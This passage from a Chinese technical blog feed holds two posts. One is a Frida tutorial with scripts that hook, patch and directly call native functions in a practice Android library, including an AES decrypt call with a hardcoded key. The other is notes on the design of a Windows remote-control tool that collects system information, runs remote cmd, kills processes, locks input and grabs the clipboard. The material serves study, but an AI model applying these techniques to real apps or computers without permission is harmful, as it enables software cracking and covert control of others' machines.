class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//根据导出函数名打印基址</span></span><br><span class="line">        <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr);</span><br><span class="line">        <span class="keyword">var</span> funcaddr = soAddr.<span class="title function_">add</span>(<span class="number">0x1071C</span>);  </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(funcaddr);</span><br><span class="line">        <span class="keyword">if</span>(funcaddr != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(funcaddr,&#123;</span><br><span class="line">                <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;  <span class="comment">//args参数</span></span><br><span class="line"></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;  <span class="comment">//retval返回值</span></span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(retval.<span class="title function_">toInt32</span>());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>函数地址计算</strong>？？？？？？？？？？？？？？？？？？？</p><ol><li>安卓里一般32 位的 so 中都是<code>thumb</code>指令，64 位的 so 中都是<code>arm</code>指令</li><li>通过IDA里的opcode bytes来判断，arm 指令为 4 个字节(options -&gt; general -&gt; Number of opcode bytes (non-graph) 输入4)</li><li>thumb 指令，函数地址计算方式： so 基址 + 函数在 so 中的偏移 + 1<br> arm 指令，函数地址计算方式： so 基址 + 函数在 so 中的偏移</li></ol><h3 id="Hook-dlopen"><a href="#Hook-dlopen" class="headerlink" title="Hook_dlopen"></a>Hook_dlopen</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> dlopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;dlopen&quot;</span>);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(dlopen, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> so_name = args[<span class="number">0</span>].<span class="title function_">readCString</span>();</span><br><span class="line">            <span class="keyword">if</span> (so_name.<span class="title function_">indexOf</span>(<span class="string">&quot;lib52pojie.so&quot;</span>) &gt;= <span class="number">0</span>) <span class="variable language_">this</span>.<span class="property">call_hook</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">call_hook</span>) <span class="title function_">hookTest2</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 高版本Android系统使用android_dlopen_ext</span></span><br><span class="line">    <span class="keyword">var</span> android_dlopen_ext = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(android_dlopen_ext, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> so_name = args[<span class="number">0</span>].<span class="title function_">readCString</span>();</span><br><span class="line">            <span class="keyword">if</span> (so_name.<span class="title function_">indexOf</span>(<span class="string">&quot;lib52pojie.so&quot;</span>) &gt;= <span class="number">0</span>) <span class="variable language_">this</span>.<span class="property">call_hook</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">call_hook</span>) <span class="title function_">hookTest2</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Frida-写数据"><a href="#Frida-写数据" class="headerlink" title="Frida 写数据"></a>Frida 写数据</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一般写在app的私有目录里，不然会报错:failed to open file (Permission denied)(实际上就是权限不足)</span></span><br><span class="line"><span class="keyword">var</span> file_path = <span class="string">&quot;/data/user/0/com.zj.wuaipojie/test.txt&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> file_handle = <span class="keyword">new</span> <span class="title class_">File</span>(file_path, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (file_handle &amp;&amp; file_handle != <span class="literal">null</span>) &#123;</span><br><span class="line">        file_handle.<span class="title function_">write</span>(data); <span class="comment">//写入数据</span></span><br><span class="line">        file_handle.<span class="title function_">flush</span>(); <span class="comment">//刷新</span></span><br><span class="line">        file_handle.<span class="title function_">close</span>(); <span class="comment">//关闭</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Frida-inlineHook与读写汇编"><a href="#Frida-inlineHook与读写汇编" class="headerlink" title="Frida_inlineHook与读写汇编"></a>Frida_inlineHook与读写汇编</h3><p>什么是inlinehook？<br>Inline hook（内联钩子）是一种在程序运行时修改函数执行流程的技术。<strong>它通过修改函数的原始代码，将目标函数的执行路径重定向到自定义的代码段，从而实现对目标函数的拦截和修改。</strong><br>简单来说就是可以对任意地址的指令进行hook读写操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">inline_hook</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (soAddr) &#123;</span><br><span class="line">        <span class="keyword">var</span> func_addr = soAddr.<span class="title function_">add</span>(<span class="number">0x10428</span>);</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(func_addr, &#123;</span><br><span class="line">                <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x22</span>); <span class="comment">//注意此时就没有args概念了</span></span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x22</span> = <span class="title function_">ptr</span>(<span class="number">1</span>); <span class="comment">//赋值方法参考上一节课</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            )</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将地址的指令解析成汇编</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> codeAddr = <span class="title class_">Instruction</span>.<span class="title function_">parse</span>(soAddr.<span class="title function_">add</span>(<span class="number">0x10428</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(codeAddr.<span class="title function_">toString</span>());</span><br></pre></td></tr></table></figure><p>Frida Api arm转hex</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> codeAddr = soAddr.<span class="title function_">add</span>(<span class="number">0x10428</span>);</span><br><span class="line"><span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(codeAddr, <span class="number">4</span>, <span class="keyword">function</span>(<span class="params">code</span>) &#123;</span><br><span class="line"><span class="keyword">const</span> writer = <span class="keyword">new</span> <span class="title class_">Arm64Writer</span>(code, &#123; <span class="attr">pc</span>: codeAddr &#125;);</span><br><span class="line">writer.<span class="title function_">putBytes</span>(<span class="title function_">hexToBytes</span>(<span class="string">&quot;20008052&quot;</span>));</span><br><span class="line">writer.<span class="title function_">flush</span>();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexToBytes</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> len = str.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">if</span> (len % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">len /= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> hexA = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = str.<span class="title function_">substr</span>(pos, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">var</span> v = <span class="built_in">parseInt</span>(s, <span class="number">16</span>);</span><br><span class="line">        hexA.<span class="title function_">push</span>(v);</span><br><span class="line">        pos += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> hexA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="普通函数与jni函数的主动调用"><a href="#普通函数与jni函数的主动调用" class="headerlink" title="普通函数与jni函数的主动调用"></a>普通函数与jni函数的主动调用</h3><table><thead><tr><th align="left">数据类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">void</td><td align="left">无返回值</td></tr><tr><td align="left">pointer</td><td align="left">指针</td></tr><tr><td align="left">int</td><td align="left">整数</td></tr><tr><td align="left">long</td><td align="left">长整数</td></tr><tr><td align="left">char</td><td align="left">字符</td></tr><tr><td align="left">float</td><td align="left">浮点数</td></tr><tr><td align="left">double</td><td align="left">双精度浮点数</td></tr><tr><td align="left">bool</td><td align="left">布尔值</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> funcAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;lib52pojie.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x1054C</span>);</span><br><span class="line"><span class="comment">//声明函数指针</span></span><br><span class="line"><span class="comment">//NativeFunction的第一个参数是地址，第二个参数是返回值类型，第三个[]里的是传入的参数类型(有几个就填几个)</span></span><br><span class="line"><span class="keyword">var</span> aesAddr = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(funcAddr , <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"><span class="keyword">var</span> encry_text = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;OOmGYpk6s0qPSXEPp4X31g==&quot;</span>);    <span class="comment">//开辟一个指针存放字符串       </span></span><br><span class="line"><span class="keyword">var</span> key = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&#x27;wuaipojie0123456&#x27;</span>); </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">aesAddr</span>(encry_text ,key).<span class="title function_">readCString</span>());</span><br></pre></td></tr></table></figure><p>jni的主动调用<br>参考java的主动调用，简单快捷</p><h3 id="frida-trace"><a href="#frida-trace" class="headerlink" title="frida-trace"></a>frida-trace</h3><p>frida-trace 可以一次性监控一堆函数地址。还能打印出比较漂亮的树状图，不仅可以显示调用流程，还能显示调用层次。并且贴心的把不同线程调用结果用不同的颜色区分开了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">D:\&gt; frida-trace.exe --<span class="built_in">help</span>  </span><br><span class="line">用法: frida-trace [options] target</span><br><span class="line"></span><br><span class="line">位置参数:  </span><br><span class="line">   args                  extra arguments and/or target</span><br><span class="line"></span><br><span class="line">选项:  </span><br><span class="line">  -h, --<span class="built_in">help</span>               显示帮助  </span><br><span class="line">  -D ID, --device ID       通过 ID 连接设备  </span><br><span class="line">  -U, --usb                通过 USB 连接设备  </span><br><span class="line">  -R, --remote             连接到远程 frida-server  </span><br><span class="line">  -H HOST, --host HOST     连接到远程 host 上的 frida-server  </span><br><span class="line">  --certificate 证书       设置证书，通过 TSL 与 host 交互                          </span><br><span class="line">  --origin ORIGIN          设置连接到远程服务的 <span class="string">&quot;Origin&quot;</span> 头部  </span><br><span class="line">  --token TOKEN            设置 与host 认证  </span><br><span class="line">  --keepalive-interval     时间间隔。0表示禁用，-1表示基于传输自动选择                          </span><br><span class="line">  --p2p                    建立一个点对点的连接  </span><br><span class="line">  --stun-server ADDRESS    设置--p2p 的 STUN 服务地址  </span><br><span class="line">  --relay address,username,password,turn-&#123;udp,tcp,tls&#125;  添加--p2p 延迟  </span><br><span class="line">  -f TARGET, --file TARGET       spawn 模式  </span><br><span class="line">  -F, --attach-frontmost         附加到最前端的 application  </span><br><span class="line">  -n NAME, --attach-name NAME    附加到一个名字                          </span><br><span class="line">  -N IDENTIFIER, --attach-identifier IDENTIFIER   附加到标识符                          </span><br><span class="line">  -p PID, --attach-pid PID        附加到 pid                          </span><br><span class="line">  -W PATTERN, --await PATTERN  </span><br><span class="line">                        await spawn matching PATTERN  </span><br><span class="line">  --stdio &#123;inherit,pipe&#125;  </span><br><span class="line">                        stdio behavior when spawning (defaults to “inherit”)  </span><br><span class="line">  --aux option          <span class="built_in">set</span> aux option when spawning, such as “uid=(int)42” (supported types are:  </span><br><span class="line">                        string, bool, int)  </span><br><span class="line">  --realm &#123;native,emulated&#125;            附件的范围  </span><br><span class="line">  --runtime &#123;qjs,v8&#125;                   使用的脚本运行环境  </span><br><span class="line">  --debug                              启用 Node.js 兼容的脚本调试器  </span><br><span class="line">  --squelch-crash                      如果启用，将不会将崩溃报告转储到控制台  </span><br><span class="line">  -O FILE, --options-file FILE         将信息保存到文件中</span><br><span class="line">  --version                            显示版本号</span><br></pre></td></tr></table></figure><ul><li><code>-i</code> &#x2F; <code>-a</code>: 跟踪 C 函数或 so 库中的函数。<br>  PS:-a 包含模块+偏移跟踪，一般用于追踪未导出函数，例子：-a “lib52pojie.so!0x4793c”</li></ul><p>包含&#x2F;排除模块或函数：</p><ul><li><code>-I</code> : 包含指定模块。</li><li><code>-X</code> : 排除指定模块。</li></ul><p>Java 方法跟踪：</p><ul><li><code>-j JAVA_METHOD</code>: 包含 Java 方法。</li><li><code>-J JAVA_METHOD</code>: 排除 Java 方法。</li></ul><p>附加方式:</p><ul><li><code>-f</code>:通过 spwan 方式启动</li><li><code>-F</code>:通过 attach 方式附加当前进程</li></ul><p>日志输出:<br><code>-o</code>:日志输出到文件</p><p>使用案例：<br>frida-trace -U -F -I “lib52pojie.so” -i “Java_” #附加当前进程并追踪lib52pojie.so里的所有Java_开头的jni导出函数</p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用WindowsAPI在Ring3进行系统操作</title>
      <link href="/2024/03/18/%E4%BD%BF%E7%94%A8WindowsAPI%E5%9C%A8Ring3%E8%BF%9B%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C/"/>
      <url>/2024/03/18/%E4%BD%BF%E7%94%A8WindowsAPI%E5%9C%A8Ring3%E8%BF%9B%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="使用Windows-API在Ring3对系统进行操作"><a href="#使用Windows-API在Ring3对系统进行操作" class="headerlink" title="使用Windows API在Ring3对系统进行操作"></a>使用Windows API在Ring3对系统进行操作</h1><h1 id="Cmd"><a href="#Cmd" class="headerlink" title="Cmd"></a>Cmd</h1><p>使用管道通信</p><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><ol><li>LoadLibrary(“Cmd.dll”);</li><li>GetProcAddress 获取下述各种函数地址</li><li>SetPipeCommunication开启管道通信</li><li>启动cmd.exe，SetPipeData发送服务端的数据</li><li>启动线程，GetPipeData获取管道内的数据（cmd返回的），向服务端发送</li><li>析构时UnsetPipeCommunication释放管道</li></ol><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>接受到客户端返回的东西然后展示</p><p>用户输入要在客户端cmd运行的东西，发送出去（IOCP）</p><h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><h2 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h2><ol><li>capGetDriverDescription获取打印机、摄像头等外部设备信息</li><li>RegOpenKey打开注册表键句柄，RegQueryValueEx传入句柄和要查的键string获取值</li><li>上述方法查到进程信息，在HARDWARE\DESCRIPTION\System\CentralProcessor\0，ProcessorNameString</li><li>发送到服务端</li></ol><h2 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h2><p>拿到信息设置进数据结构里面</p><h1 id="服务管理"><a href="#服务管理" class="headerlink" title="服务管理"></a>服务管理</h1><h2 id="客户端-2"><a href="#客户端-2" class="headerlink" title="客户端"></a>客户端</h2><ol><li>LoadLibrary(“Service.dll”);</li><li>SeEnumServiceList枚举服务信息，自己遍历一下放进BufferData，发送到服务端</li><li>接受服务端发过来的Method，ServiceName，调用SeCofigService设置服务信息。重复步骤2.</li></ol><h2 id="服务端-2"><a href="#服务端-2" class="headerlink" title="服务端"></a>服务端</h2><ol><li><p>LoadLibrary(“Service.dll”)；获取SeEnumServiceList地址</p></li><li><p>解析客户端发过来的Buffer，展示信息。调用SeEnumServiceList展示本机的服务信息</p></li><li><p>客户端信息有：<br> “服务名称”,<br> “显示名称”,<br> “启动类型”,<br> “运行状态”,<br> “可执行文件路径”<br> “服务名称”,<br> “显示名称”,<br> “启动类型”,<br> “运行状态”,<br> “可执行文件路径”<br> 本地信息有：”真实名称”,<br> “显示名称”,<br> “启动类型”,<br> “运行状态”,<br> “可执行文件路径”</p></li><li><p>根据选择给客户端发操作。<br> Method：<br> 1 启动<br> 2 停止<br> 3 自启动<br> 4 手动启动</p></li></ol><h1 id="即时消息"><a href="#即时消息" class="headerlink" title="即时消息"></a>即时消息</h1><h2 id="客户端-3"><a href="#客户端-3" class="headerlink" title="客户端"></a>客户端</h2><ol><li>#pragma comment(lib, “WINMM.LIB”) 时钟回调，其实是实现展示一下以后就关闭。消息到了响一下铃声</li><li>消息来了设置事务，然后展示到窗口</li></ol><h2 id="服务端-3"><a href="#服务端-3" class="headerlink" title="服务端"></a>服务端</h2><ol><li>获取编辑框里面的数据，检测到回车就发出去</li></ol><h1 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h1><h2 id="客户端-4"><a href="#客户端-4" class="headerlink" title="客户端"></a>客户端</h2><ol><li>LoadLibrary(“File.dll”);</li><li>GetLocalHardDiskInfo获取磁盘信息</li><li>GetLocalFileList获取文件信息</li><li>解析一下，发到服务端去</li></ol><h2 id="服务端-4"><a href="#服务端-4" class="headerlink" title="服务端"></a>服务端</h2><ol><li>CreateFileA通过DiskVolumeName打开卷句柄，通过DeviceIOControl传递FSCTL_QUERY_USN_JOURNAL得到UNS<br> USN是Update Service Number Journal or Change Journal的英文缩写，直译为“更新序列号”，是对NTFS卷里所修改过的信息进行相关记录的功能。当年微软发布Windows 2000时，建立NTFS 5.0的同时，加入了一些新功能和改进了旧版本的文件系统，为它请来了一位可靠的秘书，<strong>它可以在分区中设置监视更改的文件和目录的数量，记录下监视对象修改时间和修改内容</strong>。没错，它就是USN日志。当这个功能启用时，对于每一个NTFS卷，当发生有关添加、删除和修改文件的信息时，NTFS都使用USN日志记录下来。</li><li>再发FSCTL_ENUM_USN_DATA遍历记录，展示</li><li>监视UNS，维护数据结构</li><li>LoadLibrary(“File.dll”); GetLocalHardDiskInfo展示服务端的信息</li><li>展示信息包括<br> “名称”,<br> “显示名称”<br> “文件系统”<br> “类型”,<br> “总大小”,<br> “可用空间”</li><li>发送到客户端重新请求文件信息（我好像没找到操作客户端的函数）</li></ol><h1 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h1><h2 id="客户端-5"><a href="#客户端-5" class="headerlink" title="客户端"></a>客户端</h2><h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><ol><li>LoadLibrary(“Process.dll”);</li><li>GetProcAddress获取SeEnumProcessList，遍历进程信息。解析以后发到服务端</li><li>接收消息，调用Ring3KillProcess杀进程。</li></ol><h3 id="窗口管理"><a href="#窗口管理" class="headerlink" title="窗口管理"></a>窗口管理</h3><ol><li>LoadLibrary(“Window.dll”);（这尼玛也有对应的dll，跪了。。）</li><li>GetProcAddress获取下述函数地址</li><li>GetWindowList获取打开的窗口信息，解析一下发服务端</li><li>接收消息，调用SetWindowStatus设置窗口状态(最小化等)，调用PostWindowMessage向窗口发信息(关闭等)</li></ol><h2 id="服务端-5"><a href="#服务端-5" class="headerlink" title="服务端"></a>服务端</h2><h3 id="进程管理-1"><a href="#进程管理-1" class="headerlink" title="进程管理"></a>进程管理</h3><ol><li>LoadLibrary(“Process.dll”);，SeEnumProcessList，Ring3KillProcess，查看和操作本机的进程。</li><li>Wow64EnableWow64FsRedirection 禁止文件重定向</li><li>展示客户端的进程信息</li><li>客户点击杀进程，发消息给客户端，或者对本地操作</li><li>点击了获取进程模块信息，调用<code>OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,FALSE,ProcessID)</code>获取信息，并开一个新窗口展示</li></ol><h3 id="进程模块管理"><a href="#进程模块管理" class="headerlink" title="进程模块管理"></a>进程模块管理</h3><ol><li>GetModuleHandle(“Process.dll”);（这说明这个dll已经被导入，直接获取句柄。LoadLibrary会重新映射进内存并增加引用计数）</li><li>GetProcAddress拿到SeEnumProcessModuleList，传进PID即可获取到所有模块信息，解析以后放上窗口。包括：<br> “模块地址”,<br> “模块大小”,<br> “模块完整路径”,<br> “模块类型”,</li></ol><h3 id="窗口管理-1"><a href="#窗口管理-1" class="headerlink" title="窗口管理"></a>窗口管理</h3><ol><li>LoadLibrary(“Window.dll”); 下述函数地址都GetProcAddress而来</li><li>展示客户端和本机的消息，内容有:”窗口句柄”,<br> “窗口名称”,<br> “窗口类名称<br> “窗口状态”,<br> “启用&#x2F;禁用”<br> “线程ID”,<br> “进程ID”,<br> “占位”</li><li>GetWindowList，SetWindowStatus，PostWindowMessage操作本机，或给客户端发消息操作客户端</li><li>RestartForbidWindow重启被禁用的窗口</li><li>FixWindowTitleBar重设窗口标题</li></ol><h1 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h1><h2 id="客户端-6"><a href="#客户端-6" class="headerlink" title="客户端"></a>客户端</h2><ol><li>开线程，设置线程回调</li><li>线程回调中向服务端发送bmp位图</li><li>发送第一张截图</li><li>一直发送下一张截图</li><li>接受服务端消息，发送给位图。调用BlockInput可以锁上鼠标键盘等待消息，或解锁进行操作。</li><li>解析发来的数据，调用SetCursorPos移动鼠标，SetCapture设置画面，mouse_event和keybd_event传递键盘鼠标事件。</li><li>GetClipboardData获取剪切板发给服务端，SetClipboardData根据消息设置剪切板</li></ol><p>以上靠&lt;Windows.h&gt;（WinUser.h）提供的API实现。位图操作如下</p><ol><li>GetSystemMetrics获取屏幕分辨率</li><li>构建BITMAPINFOHEADER位图结构体</li><li>GetDesktopWindow获取屏幕句柄。GetDC获取屏幕DC。<br> 设备描述表（DC）是Windows中的一种数据结构，它包含GDI需要的所有关于显示界面情况的描述字段，包括相连的物理设备和各种各样的状态信息。在Windows画图之前，Windows程序从GDI获取设备描述表句柄（HDC），并在每次调用完GDI输出函数后将句柄返回给GDI。屏幕上的每一个窗口都对应一个DC，可以把DC想象成一个视频缓冲区，对这这个缓冲区的操作，会表现在这个缓冲区对应的屏幕窗口上。</li><li>CreateCompatibleDC创建设备上下文，CreateDIBSection把信息分配进位图里</li><li>截图位于m_BitmapInfo-&gt;bmiHeader.biSizeImage</li><li>光标调用GetCursorPos传入POINT结构</li><li>每次分段扫描全屏幕，调用BitBlt传入DC句柄，新的位图和旧的按结构作比较，如果不同就修改，然后返回新的位图</li></ol><h2 id="服务端-6"><a href="#服务端-6" class="headerlink" title="服务端"></a>服务端</h2><ol><li>根据句柄CreateCompatibleDC获取DC，CreateDIBSection把信息分配进位图里，SelectObject择一对象到指定的设备上下文环境，SetScrollRange指定滚动条范围的最小值和最大值</li><li>得到被控端发来的数据 ，将他memcpy拷贝到HBITMAP的缓冲区中，这样一个图像就出现了</li><li>后续更新一下变化部分的屏幕数据然后BitBlt、DrawIconEx重绘，memcmp比较鼠标位置，根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标，防止鼠标闪烁</li><li>汇编实现的代码控制ESI指向的数据（我看不懂了）</li><li>根据枚举类型，判断要做的操作。要获取客户端剪切板，需要一直获取，所以提交到完成端口队列。同样把自己的剪切板也要一变化就发到客户端去。</li><li>还用了内存池来管理。详见浅析nginx内存池</li></ol><h1 id="注册表管理"><a href="#注册表管理" class="headerlink" title="注册表管理"></a>注册表管理</h1><h2 id="客户端-7"><a href="#客户端-7" class="headerlink" title="客户端"></a>客户端</h2><p>全给注释了，啥也没做。其实建立好通信，就和服务端的操作一样了。</p><h2 id="服务端-7"><a href="#服务端-7" class="headerlink" title="服务端"></a>服务端</h2><ol><li>LoadLibrary(“Register.dll”);，以下函数都用这个做ModuleBase调用GetProcAddress</li><li>SeEnumRegisterDirList遍历注册表目录。解析HKEY_CLASSES_ROOT、HKEY_CURRENT_USER、HKEY_LOCAL_MACHINE、HKEY_USERS、HKEY_CURRENT_CONFIG等等目录</li><li>SeEnumRegisterItemList遍历注册表Item，列出名称，类型，数据。分开REG_SZ，REG_DWORD，REG_QWORD，REG_BINARY，REG_EXPAND_SZ</li><li>后续没有啥删除，修改的操作。。。</li></ol><h1 id="内核管理"><a href="#内核管理" class="headerlink" title="内核管理"></a>内核管理</h1><p>只有客户端有</p><h2 id="客户端-8"><a href="#客户端-8" class="headerlink" 